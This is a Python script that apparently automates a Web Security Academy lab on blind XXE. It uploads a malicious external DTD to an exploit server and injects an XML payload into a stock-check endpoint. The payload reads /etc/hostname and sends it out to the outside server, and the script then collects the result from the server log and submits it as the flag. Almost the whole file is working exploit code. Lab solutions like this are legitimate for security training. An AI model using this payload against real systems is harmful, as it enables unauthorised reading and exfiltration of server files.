#!/bin/env python3
import requests
import sys
import urllib3
from urllib.parse import urlparse
from bs4 import BeautifulSoup 
from colorama import init
from re import findall

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

header = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
	'Content-Type': 'application/x-www-form-urlencoded',
	}

def get_exploit_server(url):
	r = requests.get(url, verify=False, allow_redirects=False, proxies=proxies)
	if r.status_code == 504:
		print("\033[31m[-] The lab url is invalid, please get it again.")
		print("\033[36m[-] Response: [Server Error: Gateway Timeout]")
		sys.exit(-1)
	elif r.status_code == 200:
		suop = BeautifulSoup(r.text, 'html.parser')
		server_url = suop.find("a")['href']
		if "exploit-server.net" not in server_url:
			print("\033[31m[-] Failed to get exploit server, because you're solved the lab or the lab url is invalid.")
			sys.exit(-1)
		print("\033[36m[+] Exploit server: {0}".format(server_url))
		return server_url
	else:
		print("\033[31m[-] The lab url is invalid, please get it again.")
		sys.exit(-1)

def save_dad_file(url, server_url):
	hosts = urlparse(server_url)

	datas = """urlIsHttps=on&responseFile=%2Fexploit.dtd&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fplain%3B+charset%3Dutf-8&responseBody=%3C%21ENTITY+%25+file+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fhostname%22%3E%0D%0A%3C%21ENTITY+%25+eval+%22%3C%21ENTITY+%26%23x25%3B+exfil+SYSTEM+%27https%3a//{expserver}%2F%3Fflags%3D%25file%3B%27%3E%22%3E&formAction=STORE""".format(expserver=hosts.hostname)

	req = requests.post(server_url, data=datas, headers=header, verify=False, allow_redirects=False, proxies=proxies)

	if req.status_code == 200 and "exploit-server.net" in req.text:
		print("\033[32m[+] Saved the malicious DTD file on your server successful!")
	else:
		print("\033[33m[-] Saved the malicious DTD file on your server failed.")
		print(req.text)
		sys.exit(-1)

def exploit_xxe_dnslog(url, server_url):
	stock_path = '/product/stock'
	log_path = '/log'

	params = """<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{DTDurl}/exploit.dtd">
	%xxe;
	%eval;
	%exfil;]>
	<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
	</stockCheck>""".format(DTDurl=server_url)

	req2 = requests.post(url + stock_path, data=params, headers=header, verify=False, allow_redirects=False, proxies=proxies)

	if req2.status_code == 400:
		print("\033[36m[+] Verifying if blind XXE with external DTD exploit worked...")
		req3 = requests.get(server_url+log_path, verify=False, allow_redirects=False, proxies=proxies)
		suop = BeautifulSoup(req3.text, 'html.parser')
		logs = str(suop.find("pre"))
		flags = findall(r'(?<=flags=).*(?= HTTP)', logs)[-1]
		if flags:
			print("\033[32m[+] Blind XXE successful.")
			print("\033[36m[*] flags is: {0}".format(flags))
		return flags
	else:
		print("\033[1;31;40m[-] Blind XXE to exfiltrate data using a malicious external DTD not successful.")
		sys.exit(-1)

def submit_flags(url, flags):
	path = '/submitSolution'
	params = {'answer': flags}
	req3 = requests.post(url+path, data=params, headers=header, verify=False, proxies=proxies)

	if req3.status_code == 200 and "true" in req3.text:
		print("\033[32m[+] Auto submit flags successful!")
	else:
		print("\033[33m[-] Failed to submit flags automatically, please submit manually.")

def main():
	if len(sys.argv) != 2:
		print("\033[36m[+] Usage: {0} <url>".format(sys.argv[0]))
		print("\033[36m[+] Example: {0} https://xxx.web-security-academy.net".format(sys.argv[0]))
		sys.exit(-1)

	o = urlparse(sys.argv[1])
	url = o.scheme + "://" + o.hostname

	print("\033[36m[+] Checking blind XXE to exfiltrate data using a malicious external DTD...")

	server_url = get_exploit_server(url)
	save_dad_file(url, server_url)
	flags = exploit_xxe_dnslog(url, server_url)
	submit_flags(url, flags)

if __name__ == "__main__":
	main()
